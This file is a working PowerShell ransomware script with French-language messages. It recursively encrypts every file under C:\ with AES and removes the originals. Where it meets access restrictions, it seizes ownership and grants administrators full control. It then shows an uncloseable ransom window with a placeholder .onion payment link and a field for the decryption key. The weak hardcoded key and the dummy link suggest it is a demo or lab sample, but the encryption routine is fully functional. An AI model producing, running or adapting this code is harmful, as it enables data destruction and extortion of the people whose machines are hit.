Import-Module FileCryptography
Import-Module NTFSSecurity
Add-Type -AssemblyName System.Windows.Forms 
[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
$global:key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
$Folder = 'C:\'
$global:decryptKey = "Test"
function Encrypt([String]$Path){

$file = Get-ChildItem $Path | Where-Object {$_.mode -match "a"}
$fold = Get-ChildItem $Path | Where-Object {$_.mode -match "d"}



foreach($i in $file){

if($i.FullName -match "takeown.exe"){
    
    }else{
    try{
        Protect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Stop
    }catch{
        takeown /A /F $i.FullName
        Add-NTFSAccess -Path $i.FullName -Account "Administrateurs" -AccessRights FullControl
        Protect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Continue
        }
    }
}


foreach($f in $fold){
$test = Get-Acl $f.FullName | Select -Property Owner
echo $test
if(!$test -match "Administrateurs"){
    takeown /A /F $f.FullName
    Add-NTFSAccess -Path $f.FullName -Account "Administrateurs" -AccessRights FullControl
    }
Encrypt $f.FullName
}

} 

function Decrypt([String]$Path){

$file = Get-ChildItem $Path | Where-Object {$_.mode -match "a"}
$fold = Get-ChildItem $Path | Where-Object {$_.mode -match "d"}


foreach($i in $file){

Unprotect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction SilentlyContinue

}

foreach($f in $fold){
    Decrypt $f.FullName
}

} 

Encrypt $Folder

#----------------  Form  ----------------------
$Form = New-Object system.Windows.Forms.Form
$Form.Text = "Folder Size"
$Form.TopMost = $false
$Form.Width = 767
$Form.Height = 384
$Form.BackColor="#FFFFFF"
$Form.FormBorderStyle = 'Fixed3D'
$Form.ControlBox = $false
$Form.add_FormClosing({$_.Cancel=$true})
$Form.MaximizeBox = $false
#----------------------------------------------

#----------------  Label  ----------------------
$label1 = New-Object system.windows.Forms.Label
$label1.Text = "Cliquez sur ce lien pour payer et recuperer la cle permettant de decrypter vos donnees"
$label1.AutoSize = $true
$label1.Width = 25
$label1.Height = 10
$label1.location = new-object system.drawing.point(120,60)
$label1.Font = "Microsoft Sans Serif,10"
$Form.controls.Add($label1)

$label2 = New-Object System.Windows.Forms.LinkLabel
$label2.Text = "http://example.onion/payment"
$label2.AutoSize = $true
$label2.Width = 25
$label2.Height = 10
$label2.location = new-object system.drawing.point(270,80)
$label2.Font = "Microsoft Sans Serif,10"
$label2.add_Click({[system.Diagnostics.Process]::start("http://technet.microsoft.com")})
$Form.controls.Add($label2)

$label3 = New-Object system.windows.Forms.Label
$label3.Text = "Rentrez la cle :"
$label3.AutoSize = $true
$label3.Width = 25
$label3.Height = 10
$label3.location = new-object system.drawing.point(120,100)
$label3.Font = "Microsoft Sans Serif,10"
$Form.controls.Add($label3)

$label4 = New-Object system.windows.Forms.Label
$label4.Text = ""
$label4.AutoSize = $true
$label4.Width = 25
$label4.Height = 10
$label4.location = new-object system.drawing.point(120,160)
$label4.Font = "Microsoft Sans Serif,10"
$Form.controls.Add($label4)
#----------------------------------------------

#----------------  Textbox  ----------------------
$textBox1 = New-Object system.windows.Forms.TextBox
$textBox1.Width = 400
$textBox1.Height = 20
$textBox1.location = new-object system.drawing.point(120,120)
$textBox1.Font = "Microsoft Sans Serif,10"
$Form.controls.Add($textBox1)
#----------------------------------------------

#----------------  Button  ----------------------
$button1 = New-Object system.windows.Forms.Button
$button1.Text = "Valider"
$button1.Width = 70
$button1.Height = 25
$button1.location = new-object system.drawing.point(540,119)
$button1.Font = "Microsoft Sans Serif,10"
$Form.controls.Add($button1)
#----------------------------------------------

$button1.add_Click{
    if($textBox1.Text -match $decryptKey){
 
        Decrypt $Folder
        $label4.Text = "Termine!"
        Start-Sleep 5
        $Form.add_FormClosing({$_.Cancel=$false})
        $Form.Close()

    }
    else{
        [System.Windows.MessageBox]::Show('Mauvaise cle! Try Again.')
    }
}

[void]$Form.ShowDialog()
$Form.Dispose()